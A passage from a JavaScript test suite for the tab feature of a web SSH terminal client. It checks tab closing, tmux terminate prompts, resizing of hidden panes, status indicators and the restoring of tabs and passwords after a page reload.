  ok(!smA || env.lay.hidden(smA), 'A shows no split marker');
  clickTab(win, tabById(win, tA));
  await until(() => tabId(activeTab(win)) === tA, 500);
  const d = await tSplit(win, a, 'h', 'd.host');
  ok(!!d && tabOfPane(d) === tA, 'split from A lands in A');
  ok(panesOfTab(win, tB).length === 2, 'B still has 2 panes');
  ok(tabEls(win).length === 2, 'still two tabs');
  cleanup(env);
});

test('tabs: closing the last pane of a tab removes it and activates the right neighbour, else the left', async () => {
  const env = await mkTabEnv(TAB_PLAN()); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  const b = await tNewTab(win, 'b.host');
  const c = await tNewTab(win, 'c.host');
  if (!b || !c) { ok(false, 'setup: three tabs'); cleanup(env); return; }
  const tA = tabOfPane(a), tB = tabOfPane(b), tC = tabOfPane(c);
  // B gets a split; closing one of its two panes keeps the tab.
  clickTab(win, tabById(win, tB));
  await until(() => tabId(activeTab(win)) === tB, 500);
  const b2 = await tSplit(win, b, 'h', 'b2.host');
  win.closePane(b2.id);
  await until(() => !win.panes[b2.id], 500);
  ok(tabEls(win).length === 3 && tabId(activeTab(win)) === tB, 'closing one of two panes keeps the tab and stays in it');
  const sm = tabById(win, tB).querySelector('.tab-split');
  ok(!sm || env.lay.hidden(sm), 'split marker gone with one pane left');
  win.closePane(b.id);
  await until(() => tabEls(win).length === 2, 500);
  ok(tabEls(win).map(tabId).join() === [tA, tC].join(), 'B removed from the strip; got ' + tabEls(win).map(tabId));
  ok(!tabRootById(win, tB), 'B\'s layout root removed');
  ok(tabId(activeTab(win)) === tC, 'the right neighbour C became active; got ' + tabId(activeTab(win)));
  ok(win.activeId === c.id && !env.lay.hidden(tabRootById(win, tC)), 'C\'s pane is active and shown');
  win.closePane(c.id);
  await until(() => tabEls(win).length === 1, 500);
  ok(tabId(activeTab(win)) === tA, 'no right neighbour: the left one (A) became active');
  ok(win.activeId === a.id && !env.lay.hidden(tabRootById(win, tA)), 'A\'s pane is active and shown');
  ok(a.sid === 'sid-a.host', 'A\'s pane was never touched');
  cleanup(env);
});

test('tabs: closing the last pane of the last tab returns to the initial login form', async () => {
  const env = await mkTabEnv(TAB_PLAN()); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  win.closePane(a.id);
  await until(() => !hidden($(win, 'ov')), 500);
  ok(!hidden($(win, 'ov')) && win.overlayMode === 'initial', 'initial login form shown; mode ' + win.overlayMode);
  ok(hidden($(win, 'btnCancel')), 'and it cannot be dismissed (nothing to go back to)');
  ok(tabEls(win).length === 0, 'no tab left in the strip; got ' + tabEls(win).length);
  const b = await tConnect(win, 'b.host');
  ok(!!b && tabEls(win).length === 1 && tabOfPane(b) === tabId(activeTab(win)),
     'connecting again makes exactly one active tab; got ' + tabEls(win).length);
  cleanup(env);
});

test('tabs: the x closes a whole tab; a tab with live tmux panes asks once', async () => {
  const env = await mkTabEnv(TAB_PLAN()); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  const b1 = await tNewTab(win, 'b1.host', {persistent: true});
  const b2 = b1 && await tSplit(win, b1, 'h', 'b2.host', {persistent: true});
  const c = await tNewTab(win, 'c.host');
  if (!b1 || !b2 || !c) { ok(false, 'setup: tabs A, B (two tmux panes), C'); cleanup(env); return; }
  ok(b1.persistent && b1.slotId && b2.persistent && b2.slotId, 'B\'s panes are live tmux panes');
  const tA = tabOfPane(a), tB = tabOfPane(b1), tC = tabOfPane(c);
  clickTab(win, tabById(win, tA));
  await until(() => tabId(activeTab(win)) === tA, 500);
  const modal = confirmCounter(win);
  // x on an inactive short-lived tab: closes it, no question, A stays.
  ok(closeTabX(win, tabById(win, tC)), 'C has a .tab-close');
  await until(() => !tabById(win, tC), 500);
  ok(!tabById(win, tC) && !win.panes[c.id], 'C and its pane are gone');
  ok(modal.opened === 0, 'no confirm for a short-lived tab');
  ok(disconnectsFor(env, 'sid-c.host').length === 1 && !disconnectsFor(env, 'sid-c.host')[0].body.terminate,
     'C\'s session disconnected once, not "terminated"');
  ok(tabId(activeTab(win)) === tA && win.activeId === a.id, 'the x on an inactive tab does not switch tabs');
  // x on the tmux tab: one question for both panes; Cancel keeps all.
  closeTabX(win, tabById(win, tB));
  await until(() => modal.opened > 0, 500);
  ok(modal.opened === 1, 'one confirm for the whole tab; got ' + modal.opened);
  win.confirmCancel();
  await sleep(30);
  ok(!!tabById(win, tB) && b1.sid && b2.sid, 'Cancel keeps the tab and both sessions');
  ok(disconnectsFor(env, 'sid-b1.host').length + disconnectsFor(env, 'sid-b2.host').length === 0,
     'nothing disconnected on Cancel');
  const before = modal.opened;
  closeTabX(win, tabById(win, tB));
  await until(() => modal.opened > before, 500);
  win.confirmTerminate(false);
  await until(() => !tabById(win, tB), 500);
  await sleep(30);
  ok(modal.opened === before + 1, 'still exactly one confirm for two tmux panes; got ' + (modal.opened - before));
  ok(hidden($(win, 'confirmOv')), 'no second confirm left open');
  const d1 = disconnectsFor(env, 'sid-b1.host'), d2 = disconnectsFor(env, 'sid-b2.host');
  ok(d1.length === 1 && d1[0].body.terminate === true && d2.length === 1 && d2[0].body.terminate === true,
     'both tmux sessions terminated, once each; got ' + d1.length + '/' + d2.length);
  ok(!tabById(win, tB) && !win.panes[b1.id] && !win.panes[b2.id], 'B and its panes are gone');
  ok(tabEls(win).length === 1 && tabId(activeTab(win)) === tA, 'A remains, active');
  cleanup(env);
});

test('tabs: closing a tmux tab with "don\'t ask again" set asks nothing', async () => {
  const env = await mkTabEnv(TAB_PLAN()); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  const b1 = await tNewTab(win, 'b1.host', {persistent: true});
  const b2 = b1 && await tSplit(win, b1, 'v', 'b2.host', {persistent: true});
  if (!b2) { ok(false, 'setup'); cleanup(env); return; }
  win.localStorage.setItem('websh_terminate_no_ask', '1');
  const modal = confirmCounter(win);
  closeTabX(win, tabElOfPane(win, b1));
  await until(() => tabEls(win).length === 1, 500);
  ok(modal.opened === 0, 'no confirm');
  ok(disconnectsFor(env, 'sid-b1.host').some(e => e.body.terminate) &&
     disconnectsFor(env, 'sid-b2.host').some(e => e.body.terminate), 'both terminated');
  ok(tabId(activeTab(win)) === tabOfPane(a), 'A is active');
  cleanup(env);
});

test('tabs: middle-click closes a tab, once', async () => {
  const env = await mkTabEnv(TAB_PLAN()); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  const b = await tNewTab(win, 'b.host');
  if (!b) { ok(false, 'setup'); cleanup(env); return; }
  const tB = tabOfPane(b);
  middleClick(win, tabElOfPane(win, a));
  await until(() => tabEls(win).length === 1, 500);
  await sleep(30);
  ok(tabEls(win).length === 1 && !win.panes[a.id], 'middle-click closed A');
  ok(disconnectsFor(env, 'sid-a.host').length === 1, 'A\'s session disconnected exactly once; got ' +
     disconnectsFor(env, 'sid-a.host').length);
  ok(tabId(activeTab(win)) === tB && win.activeId === b.id, 'B stays active');
  cleanup(env);
});

test('tabs: a hidden tab keeps its output and is never fitted to its hidden box', async () => {
  const env = await mkTabEnv(TAB_PLAN()); const win = env.win;
  const urls = recordUrls(win);
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  win.flushPaneResize(a);
  await until(() => a.lastSentCols === 80, 500);
  const mark = env.log.length;
  const sizesBefore = a.term._resizes.length;
  const b = await tNewTab(win, 'b.host');
  if (!b) { ok(false, 'setup'); cleanup(env); return; }
  ok(env.lay.hidden(a.el), 'a\'s tab is hidden');
  // The output channel of the hidden pane keeps running.
  const polls = () => urls.filter(u => /action=output/.test(u) && /sid-a\.host/.test(u)).length;
  const p0 = polls();
  await until(() => polls() >= p0 + 3, 1500);
  ok(polls() >= p0 + 3, 'the hidden pane keeps asking for output; ' + (polls() - p0) + ' polls');
  ok(a.polling && a.sid === 'sid-a.host', 'the hidden pane stays connected');
  const written = [];
  const w0 = a.term.write;
  a.term.write = d => { written.push(typeof d === 'string' ? d : String.fromCharCode.apply(null, Array.from(d))); };
  win.handleOutputPayload(a, {data: b64(win, 'hello from A'), alive: true}, a.sid);
  ok(written.join('').indexOf('hello from A') >= 0, 'output reaches the hidden terminal');
  a.term.write = w0;
  // Things that refit panes, while A is hidden.
  env.lay.pump();
  win.dispatchEvent(new win.Event('resize'));
  win.zoomIn();
  await sleep(250);              // past the 150 ms resize debounce
  win.zoomOut();
  await sleep(250);
  const sizes = a.term._resizes.slice(sizesBefore);
  ok(sizes.length === 0, 'the hidden terminal is never resized; got ' + JSON.stringify(sizes));
  ok(a.term.cols === 80 && a.term.rows === 24, 'still 80x24; got ' + a.term.cols + 'x' + a.term.rows);
  const rs = resizesFor(env, 'sid-a.host', mark);
  ok(rs.length === 0, 'no /api/resize for the hidden pane; got ' + JSON.stringify(rs.map(e => e.body)));
  ok(env.log.slice(mark).filter(e => e.action === 'resize' && degenerate(e)).length === 0,
     'no degenerate resize from any pane');
  cleanup(env);
});

test('tabs: showing a tab fits its panes and resizes the PTY only when the size changed', async () => {
  const env = await mkTabEnv(TAB_PLAN()); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  win.flushPaneResize(a);
  await until(() => a.lastSentCols === 80 && a.lastSentRows === 24, 500);
  const b = await tNewTab(win, 'b.host');
  if (!b) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabOfPane(a), tB = tabOfPane(b);
  // Same size: back and forth costs no resize.
  let mark = env.log.length;
  clickTab(win, tabById(win, tA));
  await until(() => tabId(activeTab(win)) === tA, 500);
  await sleep(250);
  ok(!env.lay.hidden(a.el), 'A is shown');
  ok(a.term.cols === 80 && a.term.rows === 24, 'A fits its box: 80x24; got ' + a.term.cols + 'x' + a.term.rows);
  ok(resizesFor(env, 'sid-a.host', mark).length === 0,
     'no /api/resize when the size did not change; got ' + JSON.stringify(resizesFor(env, 'sid-a.host', mark).map(e => e.body)));
  // The window changes size while A is hidden.
  clickTab(win, tabById(win, tB));
  await until(() => tabId(activeTab(win)) === tB, 500);
  await sleep(20);
  mark = env.log.length;
  env.lay.setBox(120, 40);
  await until(() => b.term.cols === 120, 500);
  await sleep(250);
  ok(b.term.cols === 120 && b.term.rows === 40, 'the visible pane follows the window: 120x40; got ' + b.term.cols + 'x' + b.term.rows);
  ok(a.term.cols === 80 && a.term.rows === 24, 'the hidden pane is left alone; got ' + a.term.cols + 'x' + a.term.rows);
  ok(resizesFor(env, 'sid-a.host', mark).length === 0, 'and sends no resize while hidden; got ' +
     JSON.stringify(resizesFor(env, 'sid-a.host', mark).map(e => e.body)));
  mark = env.log.length;
  clickTab(win, tabById(win, tA));
  await until(() => resizesFor(env, 'sid-a.host', mark).length > 0, 1000);
  await sleep(250);
  ok(a.term.cols === 120 && a.term.rows === 40, 'shown again, A is fitted to 120x40; got ' + a.term.cols + 'x' + a.term.rows);
  const rs = resizesFor(env, 'sid-a.host', mark).map(e => e.body.cols + 'x' + e.body.rows);
  ok(rs.length === 1 && rs[0] === '120x40', 'exactly one /api/resize 120x40 for A; got ' + JSON.stringify(rs));
  ok(env.log.slice(mark).filter(e => e.action === 'resize' && degenerate(e)).length === 0, 'no degenerate resize');
  cleanup(env);
});

test('tabs: switching to a tab focuses the pane last active in it; top-bar search follows', async () => {
  const env = await mkTabEnv(TAB_PLAN()); const win = env.win;
  const a1 = await tConnect(win, 'a1.host');
  if (!needTabs(win) || !a1) { cleanup(env); return; }
  const a2 = await tSplit(win, a1, 'h', 'a2.host');
  const b = await tNewTab(win, 'b.host');
  if (!a2 || !b) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabOfPane(a1), tB = tabOfPane(b);
  clickTab(win, tabById(win, tA));
  await until(() => tabId(activeTab(win)) === tA, 500);
  fire(win, a1.el, 'mousedown', 0);           // the user clicks into a1
  fire(win, win.document, 'mouseup', 0);
  ok(win.activeId === a1.id, 'a1 active after a click into it');
  clickTab(win, tabById(win, tB));
  await until(() => tabId(activeTab(win)) === tB, 500);
  ok(win.activeId === b.id, 'B shown: its pane is active; got ' + win.activeId);
  ok(!a1.el.classList.contains('active') && b.el.classList.contains('active'), 'pane highlight moved to b');
  const f0 = a1.term._focusCalls;
  clickTab(win, tabById(win, tA));
  await until(() => tabId(activeTab(win)) === tA, 500);
  await sleep(20);
  ok(win.activeId === a1.id, 'back in A, a1 (last active there) is active, not a2; got ' + win.activeId);
  ok(a1.term._focusCalls > f0, 'keyboard focus went into a1');
  ok(a1.el.classList.contains('active') && !b.el.classList.contains('active'), 'only a1 highlighted');
  win.toggleSearch();
  ok(!a1.el.querySelector('[data-search]').classList.contains('h'), 'top-bar search opens on a1');
  ok(b.el.querySelector('[data-search]').classList.contains('h'), 'not on the hidden tab\'s pane');
  cleanup(env);
});

test('tabs: the dot shows the worst pane state, also for panes that are not active', async () => {
  const env = await mkTabEnv(TAB_PLAN()); const win = env.win;
  const a1 = await tConnect(win, 'a1.host');
  if (!needTabs(win) || !a1) { cleanup(env); return; }
  const a2 = await tSplit(win, a1, 'h', 'a2.host');
  const b = await tNewTab(win, 'b.host');
  if (!a2 || !b) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabOfPane(a1), tB = tabOfPane(b);
  clickTab(win, tabById(win, tA));
  await until(() => tabId(activeTab(win)) === tA, 500);
  win.activatePane(a2.id);
  ok(dotState(tabById(win, tA)) === 's-on' && dotState(tabById(win, tB)) === 's-on', 'both tabs green');
  // Hold a2 really in "reconnecting": any successful /api/output reply
  // rightly clears that state (the link works), so a2's output requests
  // must stop answering first. Wait for one issued after the stall, so
  // no earlier, still-answering request is in flight.
  let stalled = 0;
  const innerFetch = win.fetch;
  win.fetch = function(url, init) {
    if (/action=output/.test(String(url)) && /session_id=sid-a2\.host/.test(String(url))) {
      stalled++;
      return new Promise(() => {});
    }
    return innerFetch(url, init);
  };
  win.fetch.__state = innerFetch.__state;
  ok(await until(() => stalled > 0, 1500), 'a2\'s output channel is stalled (setup)');
  win.setReconnecting(a2, true);
  await sleep(10);
  ok(a2.reconnecting, 'a2 is still reconnecting (setup)');
  ok(dotState(tabById(win, tA)) === 's-wait', 'A amber while a2 reconnects; got ' + dotState(tabById(win, tA)));
  ok(dotState(tabById(win, tB)) === 's-on', 'B unaffected');
  // a1 is not the active pane; its session ends.
  win.handleOutputPayload(a1, {data: '', alive: false}, a1.sid);
  await sleep(10);
  ok(!a1.sid && !a1.connecting, 'a1 is disconnected (precondition)');
  ok(dotState(tabById(win, tA)) === 's-off', 'A red: disconnected beats reconnecting; got ' + dotState(tabById(win, tA)));
  win.setReconnecting(a2, false);
  await sleep(10);
  ok(dotState(tabById(win, tA)) === 's-off', 'A stays red while a1 is down; got ' + dotState(tabById(win, tA)));
  // A pane in a hidden tab goes down.
  win.handleOutputPayload(b, {data: '', alive: false}, b.sid);
  await sleep(10);
  ok(dotState(tabById(win, tB)) === 's-off', 'hidden tab B turns red when its pane disconnects; got ' + dotState(tabById(win, tB)));
  cleanup(env);
});

test('tabs: output in a hidden tab marks it; showing it clears the mark; the active tab never marks', async () => {
  const env = await mkTabEnv(TAB_PLAN()); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  const b = await tNewTab(win, 'b.host');
  if (!b) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabOfPane(a), tB = tabOfPane(b);
  const marked = id => tabById(win, id).classList.contains('activity');
  ok(!marked(tA) && !marked(tB), 'no marks at the start');
  win.handleOutputPayload(b, {data: b64(win, 'echo'), alive: true}, b.sid);    // B is active
  ok(!marked(tB), 'output in the active tab does not mark it');
  win.handleOutputPayload(a, {data: '', alive: true}, a.sid);
  ok(!marked(tA), 'an empty frame (no output) does not mark a hidden tab');
  win.handleOutputPayload(a, {data: b64(win, 'build done'), alive: true}, a.sid);
  ok(marked(tA), 'output in hidden tab A marks it (.activity)');
  clickTab(win, tabById(win, tA));
  await until(() => tabId(activeTab(win)) === tA, 500);
  ok(!marked(tA), 'showing A clears its mark');
  win.handleOutputPayload(a, {data: b64(win, 'more'), alive: true}, a.sid);
  ok(!marked(tA), 'output while A is shown does not mark it');
  clickTab(win, tabById(win, tB));
  await until(() => tabId(activeTab(win)) === tB, 500);
  ok(!marked(tA), 'output the user saw in A does not mark A once they leave it');
  cleanup(env);
});

test('tabs: the tab label and document.title follow the active tab', async () => {
  const env = await mkTabEnv(TAB_PLAN()); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  const b = await tNewTab(win, 'b.host');
  if (!b) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabOfPane(a), tB = tabOfPane(b);
  ok(tabLabel(tabById(win, tB)) === paneLabel(b), 'B labelled with b\'s pane label; got ' + tabLabel(tabById(win, tB)));
  ok(tabLabel(tabById(win, tA)) === paneLabel(a), 'A labelled with a\'s pane label; got ' + tabLabel(tabById(win, tA)));
  ok(win.document.title.indexOf(paneLabel(b)) === 0, 'title follows B; got ' + win.document.title);
  clickTab(win, tabById(win, tA));
  await until(() => tabId(activeTab(win)) === tA, 500);
  ok(win.document.title.indexOf(paneLabel(a)) === 0, 'title follows A after a click; got ' + win.document.title);
  const c = await tSplit(win, a, 'h', 'c.host');
  ok(!!c && win.activeId === c.id, 'split pane c active in A');
  ok(tabLabel(tabById(win, tA)) === paneLabel(c), 'A\'s label follows its active pane c; got ' + tabLabel(tabById(win, tA)));
  win.activatePane(a.id);
  ok(tabLabel(tabById(win, tA)) === paneLabel(a), 'and back to a; got ' + tabLabel(tabById(win, tA)));
  ok(tabLabel(tabById(win, tB)) === paneLabel(b), 'B\'s label is unaffected');
  clickTab(win, tabById(win, tB));
  await until(() => tabId(activeTab(win)) === tB, 500);
  win.closePane(b.id);
  await until(() => tabEls(win).length === 1, 500);
  ok(win.document.title.indexOf(paneLabel(a)) === 0, 'closing B: title follows A\'s active pane; got ' + win.document.title);
  cleanup(env);
});

test('tabs: Ctrl+Tab cycles panes inside the active tab only', async () => {
  const env = await mkTabEnv(TAB_PLAN()); const win = env.win;
  const a1 = await tConnect(win, 'a1.host');
  if (!needTabs(win) || !a1) { cleanup(env); return; }
  const a2 = await tSplit(win, a1, 'h', 'a2.host');
  const b = await tNewTab(win, 'b.host');
  if (!a2 || !b) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabOfPane(a1), tB = tabOfPane(b);
  const key = shift => win.document.dispatchEvent(new win.KeyboardEvent('keydown',
    {key: 'Tab', code: 'Tab', ctrlKey: true, shiftKey: !!shift, bubbles: true, cancelable: true}));
  key(); key();
  ok(win.activeId === b.id && tabId(activeTab(win)) === tB, 'in a one-pane tab Ctrl+Tab stays put; got ' + win.activeId);
  clickTab(win, tabById(win, tA));
  await until(() => tabId(activeTab(win)) === tA, 500);
  const seen = [];
  for (let i = 0; i < 4; i++) { key(); seen.push(win.activeId); }
  key(true); seen.push(win.activeId);
  ok(seen.every(id => id === a1.id || id === a2.id), 'Ctrl+Tab never leaves tab A; got ' + seen.join(','));
  ok(new Set(seen).size === 2, 'and it does cycle between a1 and a2; got ' + seen.join(','));
  ok(tabId(activeTab(win)) === tA, 'tab A stays active');
  cleanup(env);
});

test('tabs: tabs, their order, layouts and the active tab survive a reload', async () => {
  const env1 = await mkTabEnv(TAB_PLAN()); const w1 = env1.win;
  const a1 = await tConnect(w1, 'a1.host');
  if (!needTabs(w1) || !a1) { cleanup(env1); return; }
  const a2 = await tSplit(w1, a1, 'h', 'a2.host');
  const b = await tNewTab(w1, 'b.host');
  const c = await tNewTab(w1, 'c.host');
  if (!a2 || !b || !c) { ok(false, 'setup'); cleanup(env1); return; }
  clickTab(w1, tabElOfPane(w1, b));
  await until(() => tabId(activeTab(w1)) === tabOfPane(b), 500);
  await sleep(50);
  const snap = snapshotStorage(w1);
  const hostsOf = (win, t) => panesOfTab(win, tabId(t)).map(p => p.host).sort().join('+');
  const order1 = tabEls(w1).map(t => hostsOf(w1, t));
  cleanup(env1);

  const env2 = await mkTabEnv(TAB_PLAN(), snap); const w2 = env2.win;
  await until(() => paneList(w2).filter(p => p.sid).length === 4, 2000);
  ok(tabEls(w2).length === 3, 'three tabs after reload; got ' + tabEls(w2).length);
  const order2 = tabEls(w2).map(t => hostsOf(w2, t));
  ok(order2.join() === order1.join(), 'same tabs, same order, same panes in each; got ' +
     JSON.stringify(order2) + ' want ' + JSON.stringify(order1));
  ok(activeTab(w2) && hostsOf(w2, activeTab(w2)) === 'b.host', 'the active tab (b) is active again; got ' +
     (activeTab(w2) ? hostsOf(w2, activeTab(w2)) : 'none'));
  const pa = paneList(w2).find(p => p.host === 'a1.host');
  ok(!!pa && !!tabRootById(w2, tabOfPane(pa)).querySelector('.split-h'), 'A\'s split layout restored');
  const connects = env2.log.filter(e => e.action === 'connect').map(e => e.body);
  ok(['a1.host', 'a2.host', 'b.host', 'c.host'].every(h => connects.some(cb => cb.host === h && cb.password === 'pw-' + h)),
     'every pane in every tab reconnected with its own password; got ' +
     JSON.stringify(connects.map(cb => cb.host + ':' + cb.password)));
  ok(connects.every(cb => cb.cols >= 20 && cb.rows >= 5), 'no pane (hidden tabs included) connects with a degenerate size; got ' +
     JSON.stringify(connects.map(cb => cb.host + ' ' + cb.cols + 'x' + cb.rows)));
  ok(env2.log.filter(e => e.action === 'resize' && degenerate(e)).length === 0, 'no degenerate resize after reload');
  // Only switching the tab must be remembered too.
  const pc = paneList(w2).find(p => p.host === 'c.host');
  const before = JSON.stringify(snapshotStorage(w2).local);
  clickTab(w2, tabElOfPane(w2, pc));
  await until(() => JSON.stringify(snapshotStorage(w2).local) !== before, 1000);
  const snap2 = snapshotStorage(w2);
  cleanup(env2);
  const env3 = await mkTabEnv(TAB_PLAN(), snap2); const w3 = env3.win;
  await until(() => paneList(w3).filter(p => p.sid).length === 4 && !!activeTab(w3), 2000);
  ok(activeTab(w3) && hostsOf(w3, activeTab(w3)) === 'c.host', 'a tab switch alone is remembered across reload; got ' +
     (activeTab(w3) ? hostsOf(w3, activeTab(w3)) : 'none'));
  cleanup(env3);
});

test('tabs: a manifest saved by the previous version loads as one tab with its whole layout', async () => {
  const rec = h => ({label: h, via: 'manual', host: h, port: 22, user: 'u', auth: 'pw',
                     persistent: false, slot_id: null, tmux_cmd: 'tmux', cols: 80, rows: 24});
  const pre = {local: {websh_panes: JSON.stringify({
    version: 2,
    layout: {type: 'split', dir: 'h',
             a: {type: 'split', dir: 'v', a: {type: 'leaf', pane: 'p1'}, b: {type: 'leaf', pane: 'p3'}},
             b: {type: 'leaf', pane: 'p2'}},
    panes: {p1: rec('h1'), p2: rec('h2'), p3: rec('h3')},
  })}, session: {websh_panes_session: JSON.stringify({
    p1: {password: 'pw1'}, p2: {password: 'pw2'}, p3: {password: 'pw3'}})}};
  const env = await mkTabEnv(TAB_PLAN(), pre); const win = env.win;
  await until(() => paneList(win).filter(p => p.sid).length === 3, 2000);
  const connects = env.log.filter(e => e.action === 'connect').map(e => e.body);
  ok(connects.length === 3 && ['h1', 'h2', 'h3'].every(h => connects.some(cb => cb.host === h && cb.password === 'pw' + h.slice(1))),
     'all three panes reconnect with their own passwords; got ' + JSON.stringify(connects.map(cb => cb.host + ':' + cb.password)));
  if (!needTabs(win)) { cleanup(env); return; }
  ok(tabEls(win).length === 1, 'loaded as ONE tab; got ' + tabEls(win).length);
  const t = tabEls(win)[0];
  ok(!!t && t.classList.contains('active'), 'and it is active');
  ok(paneList(win).every(p => tabOfPane(p) === tabId(t)), 'all three panes are in it');
  const root = t && tabRootById(win, tabId(t));
  ok(!!root && !!root.querySelector('.split-h .split-v'), 'the nested split is kept');
  const sm = t && t.querySelector('.tab-split');
  ok(!!sm && markerSays(sm, 3), 'split marker says "3 panes"; got ' + (sm ? JSON.stringify(sm.title) : 'none'));
  await sleep(50);
  // And the next reload (new format now) still has everything.
  const snap = snapshotStorage(win);
  cleanup(env);
  const env2 = await mkTabEnv(TAB_PLAN(), snap); const w2 = env2.win;
  await until(() => paneList(w2).filter(p => p.sid).length === 3, 2000);
  ok(paneList(w2).length === 3 && tabEls(w2).length === 1, 'a second reload: still one tab with three panes; got ' +
     tabEls(w2).length + ' tab(s), ' + paneList(w2).length + ' pane(s)');
  const c2 = env2.log.filter(e => e.action === 'connect').map(e => e.body);
  ok(['h1', 'h2', 'h3'].every(h => c2.some(cb => cb.host === h && cb.password === 'pw' + h.slice(1))),
     'with the right passwords again');
  cleanup(env2);
});

test('tabs: the recovery after a long absence reaches panes in hidden tabs', async () => {
  const env = await mkTabEnv(TAB_PLAN()); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  const b = await tNewTab(win, 'b.host');
  const c = b && await tNewTab(win, 'c.host');
  if (!c) { ok(false, 'setup'); cleanup(env); return; }
  ok(env.lay.hidden(a.el) && env.lay.hidden(b.el), 'a and b are in hidden tabs');
  const kicked = new Set();
  const orig = win.kickOutput;
  win.kickOutput = function(p, force) { if (p) kicked.add(p.id); return orig.apply(this, arguments); };
  const mark = env.log.length;
  const sizes0 = [a, b].map(p => p.term._resizes.length);
  // bfcache restore: one of the two "you were away" signals.
  const ev = new win.Event('pageshow');
  Object.defineProperty(ev, 'persisted', {value: true});
  win.dispatchEvent(ev);
  await until(() => kicked.has(a.id) && kicked.has(b.id) && kicked.has(c.id), 1500);
  ok(kicked.has(a.id) && kicked.has(b.id), 'the output channel of panes in hidden tabs is restarted; kicked ' +
     Array.from(kicked).join(','));
  ok(kicked.has(c.id), 'and of the visible one');
  await sleep(250);
  ok(a.term._resizes.length === sizes0[0] && b.term._resizes.length === sizes0[1],
     'the hidden terminals were not refitted to their hidden box; got ' +
     JSON.stringify([a.term._resizes.slice(sizes0[0]), b.term._resizes.slice(sizes0[1])]));
  ok(env.log.slice(mark).filter(e => e.action === 'resize' && degenerate(e)).length === 0, 'no degenerate resize');
  win.kickOutput = orig;
  cleanup(env);
});

// ---- Tabs, round 2: what the first round did not reach ----

test('tabs: a failed + that is dismissed returns to the tab the user was on', async () => {
  // Tabs A, B with A in front. "+" -> the login fails -> the user closes
  // the form. They must be back on A, not on whichever tab happens to be
  // next to the half-made one.
  const env = await mkTabEnv(TAB_PLAN([
    {action: 'connect', match: b => b.host === 'bad.host', response: {auth_failed: true, alive: false}},
  ]));
  const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  const b = await tNewTab(win, 'b.host');
  if (!b) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabOfPane(a);
  clickTab(win, tabById(win, tA));
  await until(() => tabId(activeTab(win)) === tA, 500);
  press(win, $(win, 'tabNew'));
  await until(() => !hidden($(win, 'ov')), 1000);
  $(win, 'iH').value = 'bad.host'; $(win, 'iU').value = 'u'; $(win, 'iPw').value = 'nope';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await until(() => !hidden($(win, 'tmuxOv')) && /Authentication failed/.test($(win, 'tmTitle').textContent), 1000);
  clickBtn(win, 'tmCancel');
  await until(() => hidden($(win, 'tmuxOv')), 500);
  clickBtn(win, 'btnCancel');
  await until(() => hidden($(win, 'ov')), 500);
  ok(tabEls(win).length === 2 && tabRoots(win).length === 2, 'still two tabs, no leftover root; got ' +
     tabEls(win).length + '/' + tabRoots(win).length);
  ok(tabId(activeTab(win)) === tA, 'back on A, the tab the user was on; got the tab of ' +
     (activeTab(win) ? panesOfTab(win, tabId(activeTab(win))).map(p => p.host) : 'none'));
  ok(win.activeId === a.id, 'a is the active pane; got ' + win.activeId);
  ok(!env.lay.hidden(a.el) && env.lay.hidden(b.el), 'A shown, B hidden');
  // Same with Escape right after "+" (nothing materialized): also A.
  press(win, $(win, 'tabNew'));
  await until(() => !hidden($(win, 'ov')), 1000);
  win.document.dispatchEvent(new win.KeyboardEvent('keydown', {key: 'Escape', bubbles: true, cancelable: true}));
  await until(() => hidden($(win, 'ov')), 500);
  ok(tabId(activeTab(win)) === tA, 'Escape on an untouched + form also leaves A in front');
  cleanup(env);
});

test('tabs: a zoom made while a tab is hidden is applied when it is shown, with one resize', async () => {
  const env = await mkTabEnv(TAB_PLAN()); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  win.flushPaneResize(a);
  await until(() => a.lastSentCols === 80, 500);
  const b = await tNewTab(win, 'b.host');
  if (!b) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabOfPane(a);
  const mark = env.log.length;
  const f0 = a.term.options.fontSize;
  win.zoomIn(); win.zoomIn();
  const f1 = win.settings.fontSize;
  ok(f1 > f0, 'zoomed in: ' + f0 + ' -> ' + f1);
  const want = [Math.floor(80 * env.lay.baseFont / f1), Math.floor(24 * env.lay.baseFont / f1)];
  await until(() => b.term.cols === want[0], 1000);
  ok(b.term.cols === want[0] && b.term.rows === want[1], 'the visible pane is refitted to ' + want.join('x') +
     '; got ' + b.term.cols + 'x' + b.term.rows);
  await sleep(250);
  ok(a.term.cols === 80 && a.term.rows === 24, 'the hidden one is left alone; got ' + a.term.cols + 'x' + a.term.rows);
  ok(resizesFor(env, 'sid-a.host', mark).length === 0, 'no resize for the hidden pane');
  const m2 = env.log.length;
  clickTab(win, tabById(win, tA));
  await until(() => a.term.cols === want[0], 1000);
  await sleep(250);
  ok(a.term.options.fontSize === f1, 'shown, A gets the new font size; got ' + a.term.options.fontSize);
  ok(a.term.cols === want[0] && a.term.rows === want[1], 'and is refitted to ' + want.join('x') + '; got ' +
     a.term.cols + 'x' + a.term.rows);
